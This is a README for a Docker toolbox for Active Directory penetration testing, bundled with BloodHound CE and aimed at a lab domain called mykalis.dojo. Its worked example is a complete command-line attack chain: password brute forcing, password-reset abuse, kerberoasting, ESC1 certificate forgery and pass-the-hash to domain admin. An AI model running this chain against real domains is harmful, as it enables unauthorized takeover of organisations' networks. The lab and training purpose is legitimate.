# AD Pentest Docker

A ready-to-run Docker environment for Active Directory penetration testing.
It ships an **Ubuntu 24.04** toolbox preloaded with the tools used throughout
the `mykalis.dojo` lab, and bundles **BloodHound Community Edition** so the
graph database + web UI come up automatically and stay accessible.

- **Pentest toolbox** — `nxc` (netexec), BloodHound CE ingestor, `bloodyAD`,
  Certipy, Impacket, `kerbrute`, `rpcclient`, `smbclient`, `nmap`, `ffuf`,
  `gobuster`, RDP clients, pivoting tools, and more.
- **BloodHound CE** — PostgreSQL + Neo4j + the BloodHound web UI, wired up and
  started together with the toolbox.

---

## Quick start

```bash
# 1. Clone
git clone https://github.com/<your-user>/ad-pentest-docker.git
cd ad-pentest-docker

# 2. (optional) customize
cp .env.example .env

# 3. Build + start everything in the background
docker compose up -d --build

# 4. Drop into the pentest shell
docker compose exec pentest bash

# 5. Verify all tools are installed
docker compose exec pentest check-tools
```

That's it. BloodHound is now running in the background and reachable at:

```
http://localhost:8080/ui/login
```

---

## BloodHound CE — first login

BloodHound generates a **random initial admin password** on first start. Grab
it from the logs, then set your own password on first login:

```bash
docker compose logs bloodhound | grep -i "Initial Password"
```

Look for a block like:

```
# Initial Password Set To:   <password-here>   #
```

Log in as `admin:<password-here>`, then you will be prompted to choose a new
password. (To reset the password later, set `bhe_recreate_default_admin=true`
in `.env` and restart.)

Default database credentials (internal, for local lab use only):

| Service  | User          | Password                       |
|----------|---------------|--------------------------------|
| Postgres | `bloodhound`  | `bloodhoundcommunityedition`   |
| Neo4j    | `neo4j`       | `bloodhoundcommunityedition`   |

> Change these in `.env` if you expose this anywhere but localhost.

---

## Included tools

| Tool                        | Purpose                                  | Binary / entry point      |
|-----------------------------|------------------------------------------|---------------------------|
| netexec (nxc)               | SMB/LDAP/WinRM/RDP/MSSQL execution & auth | `nxc`, `netexec`          |
| BloodHound CE ingestor      | AD data collection (CE format)           | `bloodhound-ce-python`    |
| bloodyAD                    | LDAP abuse (e.g. `set password`)         | `bloodyAD`                |
| Certipy                     | AD CS enumeration & ESC abuse            | `certipy`                 |
| Impacket                    | `secretsdump.py`, `mssqlclient.py`, etc. | `*.py` scripts            |
| kerbrute                    | Kerberos brute-forcing                   | `kerbrute`                |
| rpcclient / smbclient       | SAMR RPC + SMB client                    | `rpcclient`, `smbclient`  |
| ldapsearch                  | Raw LDAP queries                         | `ldapsearch`              |
| nmap                        | Port / service discovery                 | `nmap`                    |
| ffuf / gobuster             | Web directory & vhost fuzzing            | `ffuf`, `gobuster`        |
| rdesktop / xfreerdp         | RDP clients (GUI / jump boxes)           | `rdesktop`, `xfreerdp`    |
| socat / proxychains4 / ssh  | Pivoting & tunneling                      | `socat`, `proxychains4`   |

`crackmapexec` is intentionally **not** installed — it is deprecated and
superseded by `netexec` (`nxc`), which is drop-in compatible.

### Tool status checker

The image ships a `check-tools` script that verifies every tool is present and
prints a version/status line for each:

```bash
docker compose exec pentest check-tools
```

It exits non-zero if anything is missing, so it can also be used as a
post-build sanity check in CI.

---

## Network model

The `pentest` container uses `network_mode: host`. This is deliberate:

- It inherits the host's VPN interface (`tun0`), so you can reach your lab
  targets (e.g. `10.8.0.0/24`) directly from inside the container.
- It reaches BloodHound at `http://localhost:8080`.

The BloodHound stack runs on an internal Docker network and publishes only the
web UI (`8080`) to the host.

---

## Worked example — mykalis.dojo

The exact workflow this image was built for:

```bash
# recon
nmap -A -n -p- 10.8.0.100
nmap -A -n -p- 10.8.0.101          # -> look for SMTP/443 => check /owa

# brute force
nxc smb 10.8.0.100 -d mykalis.dojo -u labdullah -p rockyou.txt --ignore-pw-decoding
kerbrute bruteuser -d MYKALIS.DOJO --dc 10.8.0.100 ./rockyou.txt labdullah

# collect AD data for BloodHound (upload the zip into the web UI)
bloodhound-ce-python -u labdullah -p 'P@ssw0rd' -d mykalis.dojo -ns 10.8.0.100 -c All --zip

# abuse delegated password reset
bloodyAD --host 10.8.0.100 -d mykalis.dojo -u labdullah -p 'P@ssw0rd' set password eobrien 'TempPass123!'
# ... or via SAMR:
rpcclient -U 'labdullah%P@ssw0rd' 10.8.0.100 -c 'setuserinfo2 eobrien 23 "TempPass123!"'

# kerberoast + verify the cracked password
nxc ldap 10.8.0.100 -d mykalis.dojo -u labdullah -p 'P@ssw0rd' --kerberoasting krb.txt
nxc smb 10.8.0.100 -u svc_sql -p 'PasswordStrongAuth!2025Mykalis'

# AD CS -> ESC1
certipy find -u svc_sql -p 'PasswordStrongAuth!2025Mykalis' -dc-ip 10.8.0.100 -stdout -vulnerable
certipy req -u 'svc_sql@mykalis.dojo' -p 'PasswordStrongAuth!2025Mykalis' \
  -dc-ip 10.8.0.100 -ca 'mykalis-DC-CA' -template 'Web-Server' \
  -upn 'administrator@mykalis.dojo' -sid 'S-1-5-21-718436270-1213841202-3127682982-500' \
  -out administrator.pfx -timeout 60
certipy auth -pfx administrator.pfx -dc-ip 10.8.0.100

# domain admin
nxc smb 10.8.0.100 -u "Administrator" -H aad3b435b51404eeaad3b435b51404ee:d4223ef45c991e27c2339827948a1828 \
  -x 'type C:\Users\Administrator\Desktop\proof.txt'
```

---

## Useful commands

```bash
docker compose up -d --build   # build + start everything
docker compose ps              # status
docker compose logs -f bloodhound   # watch BloodHound startup (find admin pw)
docker compose exec pentest bash    # enter the toolbox
docker compose down            # stop (keep data)
docker compose down --volumes # stop + wipe the databases
```

---

## Data persistence

Anything you write to `/data` inside the pentest container lands in `./data` on
the host (mounted volume). BloodHound's Postgres and Neo4j data persist in the
`postgres-data` and `neo4j-data` Docker volumes.
